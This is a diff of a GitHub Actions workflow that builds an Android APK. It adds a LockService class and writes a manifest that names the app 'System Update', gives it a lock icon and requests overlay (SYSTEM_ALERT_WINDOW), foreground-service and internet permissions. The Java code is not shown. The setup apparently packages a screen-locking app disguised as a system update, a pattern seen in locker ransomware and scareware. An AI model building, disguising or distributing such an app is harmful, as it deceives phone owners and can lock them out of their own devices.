@@ -1,108 +1,31 @@
 name: Build APK
-
 on: [push]
-
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-
       - uses: actions/setup-java@v4
         with:
           distribution: 'temurin'
           java-version: '17'
-
       - name: Build
         run: |
-          # Создаём структуру проекта
           mkdir -p app/src/main/java/com/rocket/webapk
-          mkdir -p app/src/main/res
-
-          if [ -f MainActivity.java ]; then
-            mv MainActivity.java app/src/main/java/com/rocket/webapk/
-          fi
-
-          # AndroidManifest.xml
-          cat > app/src/main/AndroidManifest.xml << 'EOF'
-          <?xml version="1.0" encoding="utf-8"?>
-          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
-              <uses-permission android:name="android.permission.INTERNET" />
-              <application
-                  android:label="System Update"
-                  android:icon="@android:drawable/ic_lock_lock"
-                  android:theme="@android:style/Theme.DeviceDefault">
-                  <activity
-                      android:name=".MainActivity"
-                      android:exported="true">
-                      <intent-filter>
-                          <action android:name="android.intent.action.MAIN" />
-                          <category android:name="android.intent.category.LAUNCHER" />
-                      </intent-filter>
-                  </activity>
-              </application>
-          </manifest>
-          EOF
-
-          # settings.gradle
-          cat > settings.gradle << 'EOF'
-          pluginManagement {
-              repositories {
-                  google()
-                  mavenCentral()
-                  gradlePluginPortal()
-              }
-          }
-          dependencyResolutionManagement {
-              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
-              repositories {
-                  google()
-                  mavenCentral()
-              }
-          }
-          rootProject.name = "WebApk"
-          include ':app'
-          EOF
-
-          # Root build.gradle
-          cat > build.gradle << 'EOF'
-          plugins {
-              id 'com.android.application' version '8.2.2' apply false
-          }
-          EOF
-
-          # app/build.gradle
-          cat > app/build.gradle << 'EOF'
-          plugins {
-              id 'com.android.application'
-          }
-
-          android {
-              namespace 'com.rocket.webapk'
-              compileSdk 34
-
-              defaultConfig {
-                  applicationId "com.rocket.webapk"
-                  minSdk 21
-                  targetSdk 34
-                  versionCode 1
-                  versionName "1.0"
-              }
-
-              compileOptions {
-                  sourceCompatibility JavaVersion.VERSION_17
-                  targetCompatibility JavaVersion.VERSION_17
-              }
-          }
-          EOF
-
-          # Указываем путь к SDK (уже есть на раннере)
-          echo "sdk.dir=$ANDROID_HOME" > local.properties
-
-          # Генерируем wrapper и собираем
+          mv MainActivity.java app/src/main/java/com/rocket/webapk/
+          mv LockService.java app/src/main/java/com/rocket/webapk/
+          
+          echo '<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.rocket.webapk"><uses-permission android:name="android.permission.INTERNET"/><uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/><uses-permission android:name="android.permission.FOREGROUND_SERVICE"/><application android:label="System Update" android:icon="@android:drawable/ic_lock_lock"><activity android:name=".MainActivity" android:exported="true"><intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter></activity><service android:name=".LockService" android:exported="false"/></application></manifest>' > app/src/main/AndroidManifest.xml
+          
+          echo "pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }" > settings.gradle
+          echo "include ':app'" >> settings.gradle
+          
+          echo "plugins { id 'com.android.application' }" > app/build.gradle
+          echo "android { namespace 'com.rocket.webapk' compileSdk 34 defaultConfig { applicationId 'com.rocket.webapk' minSdk 21 targetSdk 34 versionCode 1 versionName '1.0' } }" >> app/build.gradle
+          
+          echo "sdk.dir=/usr/local/lib/android/sdk" > local.properties
           gradle wrapper --gradle-version 8.5
-          ./gradlew assembleDebug --stacktrace
-
+          ./gradlew assembleDebug
       - uses: actions/upload-artifact@v4
         with:
           name: app-debug
